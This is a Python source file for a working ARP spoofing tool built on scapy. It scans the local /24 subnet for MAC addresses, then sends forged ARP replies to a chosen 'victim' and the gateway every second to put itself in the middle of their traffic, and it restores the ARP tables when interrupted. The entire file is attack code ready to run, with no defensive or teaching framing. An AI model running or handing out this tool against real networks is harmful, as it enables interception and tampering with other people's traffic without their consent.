import scapy.all as scapy
import time
import os
import sys
from colorama import Fore, Back, Style



def findMacByIP(ip, protocol=None, broadcast='ff:ff:ff:ff:ff:ff', timeout=1):
	arpRequest = scapy.ARP(pdst=ip)  # Creating packet
	broadcast = scapy.Ether(dst=broadcast)  # To send packet
	finalPacket = broadcast / arpRequest

	answeredPackets, unansweredPackets = scapy.srp(finalPacket, timeout=timeout, verbose=False)  # sending packet (and receive some)

	foundedMacs = {}

	for answeredPacketIndex in range(len(answeredPackets)):
		mac = answeredPackets[answeredPacketIndex][1].hwsrc
		ip = answeredPackets[answeredPacketIndex][1].psrc
		foundedMacs[ip] = mac

	return foundedMacs


def arpSpoof(IP1, IP2, protocol=None, ARP_TABLE=None):

	try:
		MAC1 = ARP_TABLE[IP1]
		MAC2 = ARP_TABLE[IP2]
	except: raise Exception('Cannot find routers`s or victim`s MACs.')

	arpResponse = scapy.ARP(
		op=2,
		pdst=IP2, # Now IP2 will have MAC2
		hwdst=MAC2,
		psrc=IP1 # Source (who send packet)
	)
	scapy.send(arpResponse, verbose=False)


def arpRestore(IP1, IP2, protocol=None, ARP_TABLE=None):
	try:
		MAC1 = ARP_TABLE[IP1]
		MAC2 = ARP_TABLE[IP2]
	except: raise Exception('Cannot find routers`s or victim`s MACs to restore.')

	scapy.send(
		scapy.ARP(
			op=2,
			pdst=IP1,
			hwdst=MAC1,
			psrc=IP2,
			hwsrc=MAC2
		), verbose=False
	)

def main():
	packetsCount = 0
	protocol = None

	try:
		victimIp = sys.argv[1]
		routerIp = sys.argv[2]
	except:
		print(Fore.RED + '[-] Victim`s IP and gateway have not been found.')
		exit()

	try: protocol = sys.argv[sys.argv.index('--prot') + 1]
	except: pass

	protocol = None

	print(Fore.YELLOW + '[!] Getting arp-table...')
	arpTable = findMacByIP(routerIp + '/24', protocol=protocol)
	print(Fore.GREEN + '[+] Success.')

	while True:
		try:
			arpSpoof(victimIp, routerIp, ARP_TABLE=arpTable)
			arpSpoof(routerIp, victimIp, ARP_TABLE=arpTable)

			packetsCount += 2
			time.sleep(1)

			if os.name == 'win32': os.system('cls')
			else: os.system('clear')

			print(Fore.GREEN + f'[+] Sending... Packets count: {packetsCount}')
			time.sleep(1)
		except KeyboardInterrupt:
			print(Fore.YELLOW + '[!] Closing...')

			try: arpRestore(victimIp, routerIp, ARP_TABLE=arpTable)
			except Exception as error: print(Fore.RED + f'[-] {error}')

			print(Fore.GREEN + 'Closed.')
			exit()

		except Exception as error:
			print(Fore.RED + f'[-] {error}')
			exit()

if __name__ == '__main__': main()